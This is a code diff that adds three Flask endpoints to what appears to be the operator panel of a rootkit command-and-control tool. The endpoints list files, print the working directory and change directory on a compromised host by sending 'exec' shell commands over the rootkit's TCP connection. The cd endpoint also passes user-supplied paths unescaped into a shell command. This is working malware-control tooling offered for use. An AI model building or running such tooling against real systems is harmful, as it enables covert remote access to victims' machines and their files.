@@ -200,3 +200,76 @@ def cpu_ram_command():
             return jsonify({"error": f"Failed to parse response: {str(e)}"}), 500
 
     return response, status_code
+
+@app.route('/api/ls', methods=['GET'])
+def api_list_remote_files():
+    if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
+        return jsonify({"error": "Not connected to any rootkit"}), 403
+
+    try:
+        result = cfg.rootkit_connexion.send("exec ls -pA1", use_history=False, channel="tcp")
+
+        if not result or "stdout:" not in result:
+            return jsonify({"error": f"No valid response: {result}"}), 500
+
+        stdout = result.split("stdout:")[1].split("stderr:")[0].strip()
+        lines = stdout.splitlines()
+
+        entries = []
+        for name in lines:
+            name = name.strip()
+            if not name:
+                continue
+            entry_type = "D" if name.endswith("/") else "F"
+            entries.append({
+                "type": entry_type,
+                "name": name.rstrip("/"),
+            })
+
+        return jsonify({
+            "entries": entries
+        })
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/api/pwd', methods=['GET'])
+def api_get_current_directory():
+    if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
+        return jsonify({"error": "Not connected to any rootkit"}), 403
+
+    try:
+        result = cfg.rootkit_connexion.send("exec pwd", use_history=False, channel="tcp")
+        if not result or "stdout:" not in result:
+            return jsonify({"error": f"No valid response: {result}"}), 500
+
+        stdout = result.split("stdout:")[1].split("stderr:")[0].strip()
+        current_path = stdout.splitlines()[0].strip() if stdout else "/"
+
+        return jsonify({"path": current_path})
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/api/cd', methods=['POST'])
+def api_change_directory():
+    if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
+        return jsonify({"error": "Not connected to any rootkit"}), 403
+
+    data = request.get_json()
+    path = data.get("path", "").strip() if data else ""
+    if not path:
+        return jsonify({"error": "Missing 'path' in request"}), 400
+
+    try:
+        result = cfg.rootkit_connexion.send(f"exec cd {path} && pwd", use_history=False, channel="tcp")
+        if not result or "stdout:" not in result:
+            return jsonify({"error": f"No valid response: {result}"}), 500
+
+        stdout = result.split("stdout:")[1].split("stderr:")[0].strip()
+        new_path = stdout.splitlines()[0].strip() if stdout else "/"
+
+        return jsonify({"path": new_path})
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
